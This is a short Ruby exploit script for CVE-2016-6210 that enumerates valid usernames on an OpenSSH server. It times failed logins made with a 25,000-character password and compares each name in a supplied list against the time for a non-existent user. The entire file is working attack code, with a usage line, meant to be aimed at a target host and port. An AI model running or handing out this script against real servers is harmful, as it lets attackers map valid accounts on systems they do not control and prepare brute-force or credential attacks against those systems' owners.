#!/usr/bin/env ruby
#
# CVE-2016-6210 | OpenSSHd user enumeration
# KING SABRI | @KINGSABRI
#

begin
  require 'net/ssh'
rescue
  puts "[!] Install net-ssh gem\ngem install net-ssh"
end

if ARGV.size >= 1
  host, port  = ARGV[0].split(':')
  user_list   = File.readlines ARGV[1]
  password    = 'A' * 25000
else
  puts "ruby #{__FILE__} <TARGET:PORT> <USER_LIST>"
  exit
end

def ssh(host, port, user, pass)
  begin
    starts = Time.now
    Net::SSH.start(host, user.chomp, :port => port, :password => pass, :paranoid => false, :non_interactive => true)
  rescue
    ends = Time.now
  end
  ends - starts
end

a_user = "____#{[*'A'..'Z'][rand(26)]}____"
puts "[+] Getting non-existing '#{a_user}' user time: "
# Repeate the login for more reliable time
nonxist = 0
3.times {nonxist = ssh(host, port, "#{a_user}", password)}

user_list.each do |user|
  timer = ssh(host, port, user, password)
  sleep 0.2
  puts "[+] Found user: #{user}" if timer > nonxist
end

